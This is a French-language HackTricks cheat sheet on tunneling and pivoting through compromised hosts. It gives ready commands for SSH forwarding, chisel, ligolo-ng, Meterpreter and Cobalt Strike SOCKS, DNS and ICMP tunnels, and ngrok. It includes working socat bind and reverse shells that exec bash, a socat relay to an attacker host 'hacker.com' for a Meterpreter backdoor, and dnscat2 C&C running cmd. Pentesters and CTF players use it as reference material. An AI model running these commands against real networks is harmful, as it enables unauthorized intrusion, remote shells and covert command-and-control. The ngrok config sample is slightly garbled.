# Tunneling et Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Astuce Nmap

> [!WARNING]
> Les scans **ICMP** et **SYN** ne peuvent pas être tunnélisés à travers des proxies socks, donc nous devons **désactiver la découverte par ping** (`-Pn`) et spécifier les **scans TCP** (`-sT`) pour que cela fonctionne.

## **Bash**

**Hôte -> Jump -> InterneA -> InterneB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Connexion graphique SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Ouvrir un nouveau port sur le serveur SSH --> Autre port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Port local --> Hôte compromis (SSH) --> Troisième_boîte:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Port local --> Hôte compromis (SSH) --> N'importe où
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Ceci est utile pour obtenir des shells inversés à partir d'hôtes internes à travers une DMZ vers votre hôte :
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Vous avez besoin de **root sur les deux appareils** (car vous allez créer de nouvelles interfaces) et la configuration sshd doit permettre la connexion root :\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Activer le transfert du côté serveur
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Définir une nouvelle route du côté client
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Vous pouvez **tunneler** tout le **trafic** vers un **sous-réseau** via **ssh** à travers un hôte.\
Par exemple, transférer tout le trafic allant vers 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Se connecter avec une clé privée
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Port local --> Hôte compromis (session active) --> Troisième_boîte:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Une autre façon :
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### Proxy SOCKS

Ouvrez un port dans le teamserver écoutant sur toutes les interfaces qui peut être utilisé pour **router le trafic à travers le beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Dans ce cas, le **port est ouvert sur l'hôte beacon**, pas sur le Team Server, et le trafic est envoyé au Team Server et de là à l'hôte:port indiqué.
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
À noter :

- Le reverse port forward de Beacon est conçu pour **tunneler le trafic vers le Team Server, pas pour relayer entre des machines individuelles**.
- Le trafic est **tunnelé dans le trafic C2 de Beacon**, y compris les liens P2P.
- **Les privilèges d'administrateur ne sont pas requis** pour créer des reverse port forwards sur des ports élevés.

### rPort2Port local

> [!WARNING]
> Dans ce cas, le **port est ouvert dans l'hôte beacon**, pas dans le Team Server et le **trafic est envoyé au client Cobalt Strike** (pas au Team Server) et de là au hôte:port indiqué.
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Vous devez télécharger un fichier web tunnel : ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Vous pouvez le télécharger depuis la page des versions de [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Vous devez utiliser la **même version pour le client et le serveur**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Redirection de port
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Utilisez la même version pour l'agent et le proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Liaison et Écoute de l'Agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Accéder aux ports locaux de l'agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Tunnel inversé. Le tunnel est démarré depuis la victime.\
Un proxy socks4 est créé sur 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivoter à travers **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Shell de liaison
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Shell inversée
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port via socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter via SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Vous pouvez contourner un **proxy non authentifié** en exécutant cette ligne au lieu de la dernière dans la console de la victime :
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
### Tunnel SSL Socat

**/bin/sh console**

Créez des certificats des deux côtés : Client et Serveur
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Connectez le port SSH local (22) au port 443 de l'hôte attaquant.
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

C'est comme une version console de PuTTY (les options sont très similaires à celles d'un client ssh).

Comme ce binaire sera exécuté sur la victime et qu'il s'agit d'un client ssh, nous devons ouvrir notre service ssh et notre port afin d'avoir une connexion inversée. Ensuite, pour rediriger uniquement un port accessible localement vers un port de notre machine :
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Vous devez être un administrateur local (pour n'importe quel port)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Vous devez avoir **un accès RDP sur le système**.\
Téléchargez :

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Cet outil utilise `Dynamic Virtual Channels` (`DVC`) de la fonctionnalité de Service de Bureau à Distance de Windows. DVC est responsable de **tunneling des paquets sur la connexion RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Dans votre ordinateur client, chargez **`SocksOverRDP-Plugin.dll`** comme ceci :
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Maintenant, nous pouvons **nous connecter** à la **victime** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir un **message** indiquant que le **plugin SocksOverRDP est activé**, et qu'il va **écouter** sur **127.0.0.1:1080**.

**Connectez-vous** via **RDP** et téléchargez & exécutez sur la machine de la victime le binaire `SocksOverRDP-Server.exe` :
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Maintenant, confirmez sur votre machine (attaquant) que le port 1080 est à l'écoute :
```
netstat -antb | findstr 1080
```
Maintenant, vous pouvez utiliser [**Proxifier**](https://www.proxifier.com/) **pour proxy le trafic à travers ce port.**

## Proxifier les applications GUI Windows

Vous pouvez faire naviguer les applications GUI Windows à travers un proxy en utilisant [**Proxifier**](https://www.proxifier.com/).\
Dans **Profile -> Proxy Servers**, ajoutez l'IP et le port du serveur SOCKS.\
Dans **Profile -> Proxification Rules**, ajoutez le nom du programme à proxifier et les connexions aux IP que vous souhaitez proxifier.

## Contournement du proxy NTLM

L'outil mentionné précédemment : **Rpivot**\
**OpenVPN** peut également le contourner, en définissant ces options dans le fichier de configuration :
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Il s'authentifie contre un proxy et lie un port localement qui est redirigé vers le service externe que vous spécifiez. Ensuite, vous pouvez utiliser l'outil de votre choix via ce port.\
Par exemple, cela redirige le port 443.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Maintenant, si vous configurez par exemple sur la victime le service **SSH** pour écouter sur le port 443. Vous pouvez vous y connecter via le port 2222 de l'attaquant.\
Vous pourriez également utiliser un **meterpreter** qui se connecte à localhost:443 et l'attaquant écoute sur le port 2222.

## YARP

Un proxy inverse créé par Microsoft. Vous pouvez le trouver ici : [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Un accès root est nécessaire sur les deux systèmes pour créer des adaptateurs tun et transférer des données entre eux en utilisant des requêtes DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Le tunnel sera très lent. Vous pouvez créer une connexion SSH compressée à travers ce tunnel en utilisant :
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Téléchargez-le ici**](https://github.com/iagox86/dnscat2)**.**

Établit un canal C\&C via DNS. Il n'a pas besoin de privilèges root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **Dans PowerShell**

Vous pouvez utiliser [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) pour exécuter un client dnscat2 dans powershell :
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Transfert de port avec dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Changer le DNS de proxychains

Proxychains intercepte l'appel `gethostbyname` de libc et tunnelise la requête DNS tcp à travers le proxy socks. Par **défaut**, le serveur **DNS** utilisé par proxychains est **4.2.2.2** (codé en dur). Pour le changer, éditez le fichier : _/usr/lib/proxychains3/proxyresolv_ et changez l'IP. Si vous êtes dans un **environnement Windows**, vous pouvez définir l'IP du **contrôleur de domaine**.

## Tunnels en Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## Tunneling ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Un accès root est nécessaire dans les deux systèmes pour créer des adaptateurs tun et tunneliser des données entre eux en utilisant des requêtes ICMP echo.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Téléchargez-le ici**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **est un outil pour exposer des solutions à Internet en une ligne de commande.**\
&#xNAN;_&#x45;xposition URI sont comme:_ **UID.ngrok.io**

### Installation

- Créez un compte : https://ngrok.com/signup
- Téléchargement du client :
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Usages de base

**Documentation :** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Il est également possible d'ajouter une authentification et TLS, si nécessaire._

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Exposer des fichiers avec HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing des appels HTTP

_Utile pour XSS, SSRF, SSTI ..._\
Directement depuis stdout ou dans l'interface HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling du service HTTP interne
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml exemple de configuration simple

Il ouvre 3 tunnels :

- 2 TCP
- 1 HTTP avec exposition de fichiers statiques depuis /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Autres outils à vérifier

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

{{#include ../banners/hacktricks-training.md}}
